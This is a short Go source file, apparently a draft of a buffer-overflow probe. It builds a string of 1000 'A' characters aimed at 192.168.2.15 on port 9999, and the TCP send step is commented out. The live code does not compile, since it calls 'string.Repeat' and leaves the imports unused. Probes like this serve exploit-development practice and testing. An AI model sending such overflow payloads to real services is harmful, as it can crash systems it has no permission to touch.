package main
import (
	"fmt"
	"net"
)

func main() {
	// Create variable for ip and port
	ip := "192.168.2.15"
	port := 9999


	str := string.Repeat("A", 1000)



	// // Create a buffer with 1000 'A' characters
	// overflow := make([]byte, 1000)
	// for i := range overflow {
	// 	overflow[i] = 'A'
	// }

	// // Connect to the server
	// conn, err := net.Dial("tcp", fmt.Sprintf("%s:%d", ip, port))
	// if err != nil {
	// 	fmt.Println("Error connecting:", err)
	// 	return
	// }
	// defer conn.Close()

	// // Send the overflow data
	// _, err = conn.Write(overflow)
	// if err != nil {
	// 	fmt.Println("Error sending data:", err)
	// 	return
	// }
}
